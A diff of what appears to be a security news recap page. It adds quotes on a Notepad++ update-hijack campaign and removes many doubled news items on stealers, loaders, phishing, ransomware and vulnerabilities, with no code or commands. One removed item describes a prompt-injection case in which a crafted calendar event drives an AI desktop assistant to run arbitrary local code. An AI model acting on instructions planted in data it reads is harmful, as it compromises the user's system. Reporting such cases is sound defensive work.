+The DomainTools Investigations (DTI) team described the incident as precise and a "quiet, methodical intrusion" that points to a covert intelligence-gathering mission designed to keep operational noise as low as possible. It also characterized the threat actor as having a penchant for long dwell times and multi-year campaigns.
 
+An important aspect of the campaign is that the Notepad++ source code was left intact, instead relying on trojanized installers to deliver the malicious payloads. This, in turn, allowed the attackers to bypass source-code reviews and integrity checks, effectively enabling them to stay undetected for extended periods, DTI added.
 
-      Another new Windows-oriented information stealer is Marco Stealer, which was first observed in June 2025. Delivered via a downloader in a ZIP archive, it mainly targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim's system. "Marco Stealer relies on encrypted strings that are decrypted only at runtime to avoid static analysis. In addition, the information stealer uses Windows APIs to detect anti-analysis tools like Wireshark, x64dbg, and Process Hacker," Zscaler ThreatLabz said. "Stolen data is encrypted using AES-256 before being sent to C2 servers via HTTP POST requests."
+"From their foothold inside the update infrastructure, the attackers did not indiscriminately push malicious code to the global Notepad++ user base," it said. "Instead, they exercised restraint, selectively diverting update traffic for a narrow set of targets, organizations, and individuals whose positions, access, or technical roles made them strategically valuable."
 
-Another new Windows-oriented information stealer is Marco Stealer, which was first observed in June 2025. Delivered via a downloader in a ZIP archive, it mainly targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim's system. "Marco Stealer relies on encrypted strings that are decrypted only at runtime to avoid static analysis. In addition, the information stealer uses Windows APIs to detect anti-analysis tools like Wireshark, x64dbg, and Process Hacker," Zscaler ThreatLabz said. "Stolen data is encrypted using AES-256 before being sent to C2 servers via HTTP POST requests."
+"By abusing a legitimate update mechanism relied upon specifically by developers and administrators, they transformed routine maintenance into a covert entry point for high-value access. The campaign reflects continuity in purpose, a sustained focus on regional strategic intelligence, executed with more sophisticated, more subtle, and harder-to-detect methods than in prior iterations."
 
-Telegram Sessions Hijacked via OAuth Abuse
-
-Social Engineering Campaign Targets Telegram Accounts
-
-
-      A new account takeover campaign has been observed abusing Telegram's native authentication workflows to obtain fully authorized user sessions. In one variant, victims are prompted to scan a QR code on bogus sites using the Telegram mobile application, initiating a legitimate Telegram login attempt tied to attacker-controlled API credentials. Telegram then sends an in-app authorization prompt to the victim's existing session. Alternatively, users can also enter their country code, phone number, and verification code (if enabled) on a fake web page, which causes the data to be relayed to Telegram's official authentication APIs. Upon successful verification, Telegram issues an in-app authorization request as before. "Unlike traditional phishing attacks that rely solely on credential harvesting or token replay, this campaign leverages attacker-controlled Telegram API credentials and integrates directly with Telegram's legitimate login and authorization infrastructure," CYFIRMA noted. "By inducing victims to approve in-app authorization prompts under false pretenses, the attackers achieve complete session compromise while minimizing technical anomalies and user suspicion."
-
-A new account takeover campaign has been observed abusing Telegram's native authentication workflows to obtain fully authorized user sessions. In one variant, victims are prompted to scan a QR code on bogus sites using the Telegram mobile application, initiating a legitimate Telegram login attempt tied to attacker-controlled API credentials. Telegram then sends an in-app authorization prompt to the victim's existing session. Alternatively, users can also enter their country code, phone number, and verification code (if enabled) on a fake web page, which causes the data to be relayed to Telegram's official authentication APIs. Upon successful verification, Telegram issues an in-app authorization request as before. "Unlike traditional phishing attacks that rely solely on credential harvesting or token replay, this campaign leverages attacker-controlled Telegram API credentials and integrates directly with Telegram's legitimate login and authorization infrastructure," CYFIRMA noted. "By inducing victims to approve in-app authorization prompts under false pretenses, the attackers achieve complete session compromise while minimizing technical anomalies and user suspicion."
-
-Discord Expands Global Age Checks
-
-Discord Announces Age Verification Plans
-
-
-      Discord has announced it will require all users globally to verify their ages by sharing video selfies or providing government IDs to access certain content. Additionally, it will implement an age inference model, a new system that runs in the background to help determine whether an account belongs to an adult, without always requiring users to verify their age. The company has assured that video selfies don't leave a user's device, that identity documents submitted to third-party vendors, in this case k-ID, are "deleted quickly" or "immediately" after age confirmation, and that a user's age verification status cannot be seen by other users. However, concerns have been raised about whether Discord can be trusted with their most sensitive information, especially in the aftermath of a security breach of a third-party service that Discord previously relied on to verify ages in the U.K. and Australia. The incident led to the theft of government IDs of 70,000 Discord users. In a statement given to Ars Technica, k-ID said the age estimation technology runs entirely on device and no third-parties store personal data shared during age checks. The move comes at a time when laws requiring age verification on social media platforms are being adopted across the world. Discord confirmed that "a phased global rollout" would begin in "early March," at which point all users globally would be defaulted to “teen-appropriate" experiences.
-
-Discord has announced it will require all users globally to verify their ages by sharing video selfies or providing government IDs to access certain content. Additionally, it will implement an age inference model, a new system that runs in the background to help determine whether an account belongs to an adult, without always requiring users to verify their age. The company has assured that video selfies don't leave a user's device, that identity documents submitted to third-party vendors, in this case k-ID, are "deleted quickly" or "immediately" after age confirmation, and that a user's age verification status cannot be seen by other users. However, concerns have been raised about whether Discord can be trusted with their most sensitive information, especially in the aftermath of a security breach of a third-party service that Discord previously relied on to verify ages in the U.K. and Australia. The incident led to the theft of government IDs of 70,000 Discord users. In a statement given to Ars Technica, k-ID said the age estimation technology runs entirely on device and no third-parties store personal data shared during age checks. The move comes at a time when laws requiring age verification on social media platforms are being adopted across the world. Discord confirmed that "a phased global rollout" would begin in "early March," at which point all users globally would be defaulted to “teen-appropriate" experiences.
-
-GuLoader Refines Evasion Tradecraft
-
-GuLoader Continues to Evolve
-
-
-      A new analysis of the GuLoader malware has revealed that it employs polymorphic code to dynamically construct constants during execution and exception-based control flow obfuscation to conceal its functionality and evade detection. Besides introducing sophisticated exception-handling mechanisms to complicate analysis, the malware attempts to bypass reputation-based rules by hosting payloads on trusted cloud services such as Google Drive and OneDrive. First observed in December 2019, GuLoader serves primarily as a downloader for Remote Access Trojans (RATs) and information stealers.
-
-A new analysis of the GuLoader malware has revealed that it employs polymorphic code to dynamically construct constants during execution and exception-based control flow obfuscation to conceal its functionality and evade detection. Besides introducing sophisticated exception-handling mechanisms to complicate analysis, the malware attempts to bypass reputation-based rules by hosting payloads on trusted cloud services such as Google Drive and OneDrive. First observed in December 2019, GuLoader serves primarily as a downloader for Remote Access Trojans (RATs) and information stealers.
-
-$73.6M Pig-Butchering Scam Sentence
-
-Man Sentenced to 20 Years in Prison for Crypto Scam
-
-
-      Daren Li, 42, a dual national of China and St. Kitts and Nevis has been sentenced in absentia in the U.S. to the statutory maximum of 20 years in prison and three years of supervised release for his international cryptocurrency investment scheme known as pig butchering or romance baiting that defrauded victims of more than $73.6 million. Li pleaded guilty to his crime in November 2024. However, the defendant cut off his ankle monitor and fled the country in December 2025. His present whereabouts are unknown. "As part of his plea agreement, Li admitted that unindicted members of the conspiracy would contact victims directly through unsolicited social-media interactions, telephone calls and messages, and online dating services," the U.S. Justice Department said. "The unindicted co-conspirators would gain the trust of victims by establishing either professional or romantic relationships with them, often communicating by electronic messages sent via end-to-end encrypted applications." The co-conspirators established spoofed domains and websites that resembled legitimate cryptocurrency trading platforms and tricked victims into investing in cryptocurrency through these fraudulent platforms after gaining their trust. Li also confessed that he would direct co-conspirators to open U.S. bank accounts established on behalf of 74 shell companies and would monitor the receipt of interstate and international wire transfers of victim funds. "Li and other co-conspirators would receive victim funds in financial accounts that they controlled and then monitor the conversion of victim funds to virtual currency," the department said.
-
-Daren Li, 42, a dual national of China and St. Kitts and Nevis has been sentenced in absentia in the U.S. to the statutory maximum of 20 years in prison and three years of supervised release for his international cryptocurrency investment scheme known as pig butchering or romance baiting that defrauded victims of more than $73.6 million. Li pleaded guilty to his crime in November 2024. However, the defendant cut off his ankle monitor and fled the country in December 2025. His present whereabouts are unknown. "As part of his plea agreement, Li admitted that unindicted members of the conspiracy would contact victims directly through unsolicited social-media interactions, telephone calls and messages, and online dating services," the U.S. Justice Department said. "The unindicted co-conspirators would gain the trust of victims by establishing either professional or romantic relationships with them, often communicating by electronic messages sent via end-to-end encrypted applications." The co-conspirators established spoofed domains and websites that resembled legitimate cryptocurrency trading platforms and tricked victims into investing in cryptocurrency through these fraudulent platforms after gaining their trust. Li also confessed that he would direct co-conspirators to open U.S. bank accounts established on behalf of 74 shell companies and would monitor the receipt of interstate and international wire transfers of victim funds. "Li and other co-conspirators would receive victim funds in financial accounts that they controlled and then monitor the conversion of victim funds to virtual currency," the department said.
-
-0-Click AI Prompt RCE Risk
-
-0-Click Flaw in Claude Desktop Extensions
-
-
-      A zero-click remote code execution vulnerability (CVSS score: 10.0) in Claude Desktop Extensions (DXT) could be exploited to silently compromise a system by a simple Google Calendar event when a user issues a harmless prompt like "Please check my latest events in google cal[endar] and then take care of it for me." The problem stems from how MCP-based systems like Claude DXT autonomously chain together different tools and external connectors to fulfil user requests without enforcing proper security boundaries. The phrase "take care of it" does the heavy lifting here, as the artificial intelligence (AI) assistant interprets it as a justification to execute arbitrary instructions embedded in those events without seeking users' permission. The flaw impacts more than 10,000 active users and 50 DXT extensions, according to LayerX. "Unlike traditional browser extensions, Claude Desktop Extensions run unsandboxed with full system privileges," the browser security company said. "As a result, Claude can autonomously chain low-risk connectors (e.g., Google Calendar) to high-risk local executors, without user awareness or consent. If exploited by a bad actor, even a benign prompt ('take care of it'), coupled with a maliciously worded calendar event, is sufficient to trigger arbitrary local code execution that compromises the entire system." Anthropic has opted not to fix the issue at this time. A similar Google Gemini prompt injection flaw was disclosed by Miggo Security last month.
-
-A zero-click remote code execution vulnerability (CVSS score: 10.0) in Claude Desktop Extensions (DXT) could be exploited to silently compromise a system by a simple Google Calendar event when a user issues a harmless prompt like "Please check my latest events in google cal[endar] and then take care of it for me." The problem stems from how MCP-based systems like Claude DXT autonomously chain together different tools and external connectors to fulfil user requests without enforcing proper security boundaries. The phrase "take care of it" does the heavy lifting here, as the artificial intelligence (AI) assistant interprets it as a justification to execute arbitrary instructions embedded in those events without seeking users' permission. The flaw impacts more than 10,000 active users and 50 DXT extensions, according to LayerX. "Unlike traditional browser extensions, Claude Desktop Extensions run unsandboxed with full system privileges," the browser security company said. "As a result, Claude can autonomously chain low-risk connectors (e.g., Google Calendar) to high-risk local executors, without user awareness or consent. If exploited by a bad actor, even a benign prompt ('take care of it'), coupled with a maliciously worded calendar event, is sufficient to trigger arbitrary local code execution that compromises the entire system." Anthropic has opted not to fix the issue at this time. A similar Google Gemini prompt injection flaw was disclosed by Miggo Security last month.
-
-Data-Theft Ransomware Surges
-
-Coinbase Cartel Claims Over 60 Victims
-
-
-      A nascent ransomware group called Coinbase Cartel has claimed more than 60 victims since it first emerged in September 2025. "Coinbase Cartel operations are marked by an insistence on stealing data while leaving systems available rather than complementing data theft with the use of encryptors that prohibit system access," Bitdefender said. The healthcare, technology, and transportation industries represent a major chunk of Coinbase Cartel's greatest victim demographic to date. The healthcare organizations impacted by the threat actor are primarily based in the U.A.E. Some of the other prominent groups that are focused on only data theft are World Leaks and PEAR (Pure Extraction and Ransom). The development paints a picture of an ever-evolving ransomware landscape populated by new and old actors, even as the threat is getting increasingly professionalized as attackers streamline operations. According to data from Cyble, 6,604 ransomware attacks were recorded in 2025, up 52% from the 4,346 attacks claimed by ransomware groups in 2024.
-
-A nascent ransomware group called Coinbase Cartel has claimed more than 60 victims since it first emerged in September 2025. "Coinbase Cartel operations are marked by an insistence on stealing data while leaving systems available rather than complementing data theft with the use of encryptors that prohibit system access," Bitdefender said. The healthcare, technology, and transportation industries represent a major chunk of Coinbase Cartel's greatest victim demographic to date. The healthcare organizations impacted by the threat actor are primarily based in the U.A.E. Some of the other prominent groups that are focused on only data theft are World Leaks and PEAR (Pure Extraction and Ransom). The development paints a picture of an ever-evolving ransomware landscape populated by new and old actors, even as the threat is getting increasingly professionalized as attackers streamline operations. According to data from Cyble, 6,604 ransomware attacks were recorded in 2025, up 52% from the 4,346 attacks claimed by ransomware groups in 2024.
-
-Google Expands Privacy Takedowns
-
-Google Adds New Options "Results about you" 
-
-
-      Google has expanded its "Results about you" tool to give users more control over sensitive personal information and added a way to request removal of non-consensual explicit images from search results, as well as other details like driver's license numbers, passport numbers, and Social Security numbers. "We understand that removing existing content is only part of the solution," Google said. "For added protection, the new process allows you to opt in to safeguards that will proactively filter out any additional explicit results that might appear in similar searches."
-
-Google has expanded its "Results about you" tool to give users more control over sensitive personal information and added a way to request removal of non-consensual explicit images from search results, as well as other details like driver's license numbers, passport numbers, and Social Security numbers. "We understand that removing existing content is only part of the solution," Google said. "For added protection, the new process allows you to opt in to safeguards that will proactively filter out any additional explicit results that might appear in similar searches."
-
-Monitoring Tools Used for Ransomware
-
-Crazy Ransomware Gang Abuses Net Monitor and SimpleHelp 
-
-
-      Threat actors have been observed leveraging Net Monitor, a commercial workforce monitoring tool, with SimpleHelp, a legitimate remote monitoring and management (RMM) platform, as part of attacks designed to deploy Crazy ransomware. The two incidents, believed to be the work of the same threat actor, took place in January and February 2026. Net Monitor comes with various capabilities that go beyond employee productivity tracking, including reverse shell connections, remote desktop control, file management, and the ability to customize service and process names during installation. These features, coupled with SimpleHelp's remote access functionality, make them attractive tools for attackers looking to blend into enterprise environments without deploying traditional malware. What's more, Net Monitor for Employees Professional bundles a pseudo-terminal ("winpty-agent.exe") that facilitates full command execution. Bad actors have been found to leverage this aspect to conduct reconnaissance, deliver additional payloads, and deploy secondary remote access channels, turning it into a functional remote access trojan. "In the cases observed, threat actors used these two tools together, using Net Monitor for Employees as a primary remote access channel and SimpleHelp as a redundant persistence layer, ultimately leading to the attempted deployment of Crazy ransomware," Huntress said.
-
-Threat actors have been observed leveraging Net Monitor, a commercial workforce monitoring tool, with SimpleHelp, a legitimate remote monitoring and management (RMM) platform, as part of attacks designed to deploy Crazy ransomware. The two incidents, believed to be the work of the same threat actor, took place in January and February 2026. Net Monitor comes with various capabilities that go beyond employee productivity tracking, including reverse shell connections, remote desktop control, file management, and the ability to customize service and process names during installation. These features, coupled with SimpleHelp's remote access functionality, make them attractive tools for attackers looking to blend into enterprise environments without deploying traditional malware. What's more, Net Monitor for Employees Professional bundles a pseudo-terminal ("winpty-agent.exe") that facilitates full command execution. Bad actors have been found to leverage this aspect to conduct reconnaissance, deliver additional payloads, and deploy secondary remote access channels, turning it into a functional remote access trojan. "In the cases observed, threat actors used these two tools together, using Net Monitor for Employees as a primary remote access channel and SimpleHelp as a redundant persistence layer, ultimately leading to the attempted deployment of Crazy ransomware," Huntress said.
-
-0APT Victim Claims Questioned
-
-0APT's 200 Victim Count Likely a Hoax
-
-
-      A threat actor called 0APT appears to be falsely claiming that it has breached over 200 victims within a span of a week since launching their data leak site on January 28, 2026. Further analysis has determined that the victims are a blend of wholly fabricated generic company names and recognizable organizations that threat actors have not breached, GuidePoint's Research and Intelligence Team said. The data leak site went offline on February 8, 2026, before resurfacing the next day with a list of more than 15 very large multinational organizations. "0APT is likely operating in this deceptive manner in order to support extortion of uninformed victims, re-extortion of historical victims from other groups, defrauding of potential affiliates, or to garner interest in a nascent RaaS group," security researcher Jason Baker noted. While signs suggest that the group may be bluffing about its victim count, the Windows and Linux ransomware samples have been found to be fully operational, per Halcyon. It's worth pointing out that ransomware groups like RansomedVC have listed fabricated attacks on their data leak sites to deceive victims. Viewed in that light, 0APT's exaggerated claims are likely an attempt to gain visibility and momentum among its peers. Its origins remain unknown.
-
-A threat actor called 0APT appears to be falsely claiming that it has breached over 200 victims within a span of a week since launching their data leak site on January 28, 2026. Further analysis has determined that the victims are a blend of wholly fabricated generic company names and recognizable organizations that threat actors have not breached, GuidePoint's Research and Intelligence Team said. The data leak site went offline on February 8, 2026, before resurfacing the next day with a list of more than 15 very large multinational organizations. "0APT is likely operating in this deceptive manner in order to support extortion of uninformed victims, re-extortion of historical victims from other groups, defrauding of potential affiliates, or to garner interest in a nascent RaaS group," security researcher Jason Baker noted. While signs suggest that the group may be bluffing about its victim count, the Windows and Linux ransomware samples have been found to be fully operational, per Halcyon. It's worth pointing out that ransomware groups like RansomedVC have listed fabricated attacks on their data leak sites to deceive victims. Viewed in that light, 0APT's exaggerated claims are likely an attempt to gain visibility and momentum among its peers. Its origins remain unknown.
-
-SYSTEM RCE via Named Pipe
-
-Flaw in Quest Desktop Authority Detailed
-
-
-      A high-risk security vulnerability (CVE-2025-67813, CVSS score: 5.3) within Quest Desktop Authority could allow attackers to execute remote code with SYSTEM privileges. "Quest KACE Desktop Authority exposes a named pipe (ScriptLogic_Server_NamedPipe_9300) running as SYSTEM that accepts connections from any authenticated domain user over the network," NetSPI said. The named pipe implements a custom IPC protocol that supports dangerous operations, including arbitrary command execution, DLL injection, credential retrieval, and COM object invocation. Any authenticated user on the network can achieve remote code execution as a local administrator on hosts running the Desktop Authority agent.
-
-A high-risk security vulnerability (CVE-2025-67813, CVSS score: 5.3) within Quest Desktop Authority could allow attackers to execute remote code with SYSTEM privileges. "Quest KACE Desktop Authority exposes a named pipe (ScriptLogic_Server_NamedPipe_9300) running as SYSTEM that accepts connections from any authenticated domain user over the network," NetSPI said. The named pipe implements a custom IPC protocol that supports dangerous operations, including arbitrary command execution, DLL injection, credential retrieval, and COM object invocation. Any authenticated user on the network can achieve remote code execution as a local administrator on hosts running the Desktop Authority agent.
-
-AI Traffic Scans to Block VPNs
-
-Russia to Analyze Internet Traffic Using AI to Flag VPN Usage
-
-
-      Russia's internet watchdog will use artificial intelligence (AI) technology to analyze internet traffic and restrict the operation of VPN services, Forbes Russia reported. The Roskomnadzor is expected to spend close to $30 million to develop the internet traffic filtering mechanism this year. The Russian government has blocked access to tens of VPN apps in recent years. It also maintains a registry of banned websites.
-
-Russia's internet watchdog will use artificial intelligence (AI) technology to analyze internet traffic and restrict the operation of VPN services, Forbes Russia reported. The Roskomnadzor is expected to spend close to $30 million to develop the internet traffic filtering mechanism this year. The Russian government has blocked access to tens of VPN apps in recent years. It also maintains a registry of banned websites.
-
-Mispadu Expands Banking Attacks
-
-Mexico and Brazil Targeted by Mispadu Trojan
-
-
-      Cofense said it has observed Mispadu campaigns targeting Latin America, particularly Mexico and Brazil, and to a lesser extent in Spain, Italy, and Portugal, with phishing emails containing HTML Application (HTA) attachments that are designed to bypass Secure Email Gateways (SEGs) to reach the inboxes of employees across the world. "The only variation is that sometimes the URL delivering the HTA files is embedded in an attached, password-protected PDF rather than embedded in the email itself," Cofense said. "In all recent campaigns, Mispadu makes use of an AutoIT loader and various legitimate files to run the malicious content. Each step of the delivery chain from the attached PDF to the AutoIT script is dynamically generated. This means that every hash except for the AutoIT compiler is unique to each install, further frustrating EDR." Recent iterations of the banking trojan come with the ability to self-propagate on infected hosts via email and expand the target online banking websites to include banks outside of Latin America as well as cryptocurrency-based exchanges.
-
-Cofense said it has observed Mispadu campaigns targeting Latin America, particularly Mexico and Brazil, and to a lesser extent in Spain, Italy, and Portugal, with phishing emails containing HTML Application (HTA) attachments that are designed to bypass Secure Email Gateways (SEGs) to reach the inboxes of employees across the world. "The only variation is that sometimes the URL delivering the HTA files is embedded in an attached, password-protected PDF rather than embedded in the email itself," Cofense said. "In all recent campaigns, Mispadu makes use of an AutoIT loader and various legitimate files to run the malicious content. Each step of the delivery chain from the attached PDF to the AutoIT script is dynamically generated. This means that every hash except for the AutoIT compiler is unique to each install, further frustrating EDR." Recent iterations of the banking trojan come with the ability to self-propagate on infected hosts via email and expand the target online banking websites to include banks outside of Latin America as well as cryptocurrency-based exchanges.
-
-ScreenConnect Deployed via Phish
-
-Phishing Campaign Delivers ConnectWise ScreenConnect for Remote Access
-
-
-      In a phishing campaign documented by Forcepoint, spoofed emails have been found to deliver a malicious .cmd attachment that escalates privileges, disables Windows SmartScreen, removes the mark-of-the-web (MotW) to bypass security warnings, and ultimately installs ConnectWise ScreenConnect. The campaign has targeted organizations across the U.S., Canada, the U.K., and Northern Ireland, focusing on sectors with high-value data, including government, healthcare, and logistics companies. Recent phishing attacks have also abused web services from Amazon, like Simple Storage Service (S3) buckets, Amazon Simple Email Service (SES), and Amazon Web Services (AWS) Amplify to slip past email security controls and launch credential phishing attacks. Other phishing attacks have embraced uncommon techniques like using edited versions of legitimate business emails to deliver convincingly spoofed emails to recipients. "These emails work by having the threat actor create an account on a legitimate service and input arbitrary text into a field that will later be included in outgoing emails," Cofense said. "After this is done, the threat actor would need to receive a legitimate email that happens to include the malicious text that was created by the threat actor. Once the email is received, the threat actor can then redirect the email to the intended victims."
-
-In a phishing campaign documented by Forcepoint, spoofed emails have been found to deliver a malicious .cmd attachment that escalates privileges, disables Windows SmartScreen, removes the mark-of-the-web (MotW) to bypass security warnings, and ultimately installs ConnectWise ScreenConnect. The campaign has targeted organizations across the U.S., Canada, the U.K., and Northern Ireland, focusing on sectors with high-value data, including government, healthcare, and logistics companies. Recent phishing attacks have also abused web services from Amazon, like Simple Storage Service (S3) buckets, Amazon Simple Email Service (SES), and Amazon Web Services (AWS) Amplify to slip past email security controls and launch credential phishing attacks. Other phishing attacks have embraced uncommon techniques like using edited versions of legitimate business emails to deliver convincingly spoofed emails to recipients. "These emails work by having the threat actor create an account on a legitimate service and input arbitrary text into a field that will later be included in outgoing emails," Cofense said. "After this is done, the threat actor would need to receive a legitimate email that happens to include the malicious text that was created by the threat actor. Once the email is received, the threat actor can then redirect the email to the intended victims."
-
-CrashFix Delivers SystemBC
-
-CrashFix Variant Attack Delivers Python Implants and SystemBC 
-
-
-      A variant of the ClickFix attack called CrashFix has been used to deliver malicious payloads consistent with a known malware called SystemBC. Unlike the CrashFix-style social engineering flow documented by Huntress and Microsoft, the attack stands out because it did not involve the use of a malicious browser extension. "Instead, the victim was convinced to execute a command via the Windows Run dialog (Win+R) as seen with traditional ClickFix," Binary Defense said. "This command abused a legitimate Windows binary – finger.exe – copied from System32, renamed, and executed from a user-writable directory. The output of this execution was piped directly into cmd.exe, acting as a delivery mechanism for an obfuscated PowerShell payload." The PowerShell code then retrieves follow-on content, including Python backdoors and a DLL implant that overlaps with SystemBC, from attacker-controlled infrastructure, while taking steps to fingerprint the host and clean up artifacts on disk. "The coexistence of Python backdoors and a reflective DLL implant highlights a deliberate defense-evasion and persistence strategy," the company said. "By mixing scripting-based and native implants, the attacker reduced reliance on any single execution method, making complete eviction more difficult."
-
-A variant of the ClickFix attack called CrashFix has been used to deliver malicious payloads consistent with a known malware called SystemBC. Unlike the CrashFix-style social engineering flow documented by Huntress and Microsoft, the attack stands out because it did not involve the use of a malicious browser extension. "Instead, the victim was convinced to execute a command via the Windows Run dialog (Win+R) as seen with traditional ClickFix," Binary Defense said. "This command abused a legitimate Windows binary – finger.exe – copied from System32, renamed, and executed from a user-writable directory. The output of this execution was piped directly into cmd.exe, acting as a delivery mechanism for an obfuscated PowerShell payload." The PowerShell code then retrieves follow-on content, including Python backdoors and a DLL implant that overlaps with SystemBC, from attacker-controlled infrastructure, while taking steps to fingerprint the host and clean up artifacts on disk. "The coexistence of Python backdoors and a reflective DLL implant highlights a deliberate defense-evasion and persistence strategy," the company said. "By mixing scripting-based and native implants, the attacker reduced reliance on any single execution method, making complete eviction more difficult."
-
-76 Zero-Days Found in Cars
-
-Pwn2Own Automotive 2026 Finds 76 Zero-days
-
-
-      The third annual Pwn2Own Automotive competition held in Tokyo, Japan, late last month uncovered 76 unique zero-day vulnerabilities in a variety of targets, such as in-vehicle infotainment (IVI) systems (Tesla), electric vehicle (EV) chargers (Alpitronic HYC50, ChargePoint Home Flex), and car operating systems (Automotive Grade Linux). Team Fuzzware.io won the hacking competition with total winnings of $215,000, followed by Team DDOS with $100,750 and Synactiv with $85,000.
-
-The third annual Pwn2Own Automotive competition held in Tokyo, Japan, late last month uncovered 76 unique zero-day vulnerabilities in a variety of targets, such as in-vehicle infotainment (IVI) systems (Tesla), electric vehicle (EV) chargers (Alpitronic HYC50, ChargePoint Home Flex), and car operating systems (Automotive Grade Linux). Team Fuzzware.io won the hacking competition with total winnings of $215,000, followed by Team DDOS with $100,750 and Synactiv with $85,000.
-
-Bing Ads Funnel Tech Scams
-
-Fake Bing Ads Lead to Tech Support Scams
-
-
-      Malicious ads served on Bing search results when searching for sites like Amazon are being used to redirect unsuspecting users to tech support scam links hosted in Azure Blob Storage. The campaign targeted healthcare, manufacturing, and technology sectors in the U.S. "Clicking on the malicious ad sent the victims to highswit[.]space, a newly registered domain hosting an empty WordPress site, which then redirected them to one of the Azure Blob Storage containers, which served a typical tech support scam site," Netskope Threat Labs said.
-
-Malicious ads served on Bing search results when searching for sites like Amazon are being used to redirect unsuspecting users to tech support scam links hosted in Azure Blob Storage. The campaign targeted healthcare, manufacturing, and technology sectors in the U.S. "Clicking on the malicious ad sent the victims to highswit[.]space, a newly registered domain hosting an empty WordPress site, which then redirected them to one of the Azure Blob Storage containers, which served a typical tech support scam site," Netskope Threat Labs said.
-
-Chinese VPN Infra Footprint Expands
-
-Chinese VPN Used by Devices in Russia, China, Myanmar, Iran, and Venezuela
-
-
-      A Chinese virtual private network (VPN) provider named LVCHA VPN has been used by devices in Russia, China, Myanmar, Iran, and Venezuela. It also has an Android app that's directly hosted on its website ("lvcha[.]in") and distributed via the Google Play Store. Further analysis of the domain has uncovered a cluster of nearly 50 suspicious domains, all of which promote the same VPN. "Whenever we see campaigns promoting suspicious downloads or products using so many domains, it can indicate that the operator is rotating domains to work around country-level firewalls in regions where they’re trying to promote distribution," Silent Push said.
-
-A Chinese virtual private network (VPN) provider named LVCHA VPN has been used by devices in Russia, China, Myanmar, Iran, and Venezuela. It also has an Android app that's directly hosted on its website ("lvcha[.]in") and distributed via the Google Play Store. Further analysis of the domain has uncovered a cluster of nearly 50 suspicious domains, all of which promote the same VPN. "Whenever we see campaigns promoting suspicious downloads or products using so many domains, it can indicate that the operator is rotating domains to work around country-level firewalls in regions where they’re trying to promote distribution," Silent Push said.
-
-Grid Attack Triggers Western Alerts
-
-U.K. and U.S. Issue Warning After Poland Energy Grid Cyber Attack
-
-
-      Following a late December 2025 coordinated cyber attack on Poland's power grid, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) has published a bulletin for critical infrastructure owners and operators. CISA said vulnerable edge devices remain a prime target for threat actors, OT devices without firmware verification can be permanently damaged, and threat actors leverage default credentials to pivot onto the HMI and RTUs. "Operators should prioritize updates that allow firmware verification when available," the agency added. "Operators should immediately change default passwords and establish requirements for integrators or OT suppliers to enforce password changes in the future." In a similar development, Jonathan Ellison, director for national resilience at the National Cyber Security Centre (NCSC), has urged critical infrastructure operators in the country to act now and have incident response plans or playbooks in place to respond to such threats. "Although attacks can still happen, strong resilience and recovery plans reduce both the chances of an attack succeeding and the impact if one does," Ellison said.
-
-Following a late December 2025 coordinated cyber attack on Poland's power grid, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) has published a bulletin for critical infrastructure owners and operators. CISA said vulnerable edge devices remain a prime target for threat actors, OT devices without firmware verification can be permanently damaged, and threat actors leverage default credentials to pivot onto the HMI and RTUs. "Operators should prioritize updates that allow firmware verification when available," the agency added. "Operators should immediately change default passwords and establish requirements for integrators or OT suppliers to enforce password changes in the future." In a similar development, Jonathan Ellison, director for national resilience at the National Cyber Security Centre (NCSC), has urged critical infrastructure operators in the country to act now and have incident response plans or playbooks in place to respond to such threats. "Although attacks can still happen, strong resilience and recovery plans reduce both the chances of an attack succeeding and the impact if one does," Ellison said.
-
-Telnet Traffic Abruptly Collapses
-
-Global Telnet Traffic Dropped in Mid-January 2026 
-
-
-      Threat intelligence firm GreyNoise said it observed a steep decline in global Telnet traffic on January 14, 2026, six days before a security advisory for CVE-2026-24061 went public on January 20. CVE-2026-24061 relates to a critical vulnerability in the GNU InetUtils telnet daemon that could result in an authentication bypass. Data gathered by GreyNoise shows that the hourly volume of Telnet sessions dropped 65% on January 14 at 21:00 UTC, then fell 83% within two hours. Daily sessions have declined from an average of 914,000 (from December 1, 2025, to January 14, 2026) to around 373,000, equating to a 59% reduction that has persisted as of February 10, 2026. "Eighteen ASNs with significant pre-drop telnet volume (>50K sessions each) went to absolute zero after January 15," the company said. "Five entire countries vanished from GreyNoise telnet data: Zimbabwe, Ukraine, Canada, Poland, and Egypt. Not reduced to zero." Among the 18 ASNs included were British Telecom, Charter/Spectrum, Cox Communications, and Vultr. Although correlation does not imply causation, GreyNoise has raised the possibility that the telecom operators likely received advance warning about CVE-2026-24061, allowing them to act on it at the infrastructure level. "A backbone or transit provider — possibly responding to a coordinated request, possibly acting on their own assessment — implemented port 23 filtering [to block telnet traffic] on transit links," it said.
-
-Threat intelligence firm GreyNoise said it observed a steep decline in global Telnet traffic on January 14, 2026, six days before a security advisory for CVE-2026-24061 went public on January 20. CVE-2026-24061 relates to a critical vulnerability in the GNU InetUtils telnet daemon that could result in an authentication bypass. Data gathered by GreyNoise shows that the hourly volume of Telnet sessions dropped 65% on January 14 at 21:00 UTC, then fell 83% within two hours. Daily sessions have declined from an average of 914,000 (from December 1, 2025, to January 14, 2026) to around 373,000, equating to a 59% reduction that has persisted as of February 10, 2026. "Eighteen ASNs with significant pre-drop telnet volume (>50K sessions each) went to absolute zero after January 15," the company said. "Five entire countries vanished from GreyNoise telnet data: Zimbabwe, Ukraine, Canada, Poland, and Egypt. Not reduced to zero." Among the 18 ASNs included were British Telecom, Charter/Spectrum, Cox Communications, and Vultr. Although correlation does not imply causation, GreyNoise has raised the possibility that the telecom operators likely received advance warning about CVE-2026-24061, allowing them to act on it at the infrastructure level. "A backbone or transit provider — possibly responding to a coordinated request, possibly acting on their own assessment — implemented port 23 filtering [to block telnet traffic] on transit links," it said.
-
-New Loaders Fuel Stealer Campaigns
-
-New RenEngine and Foxveil Malware Loaders Spotted 
-
-
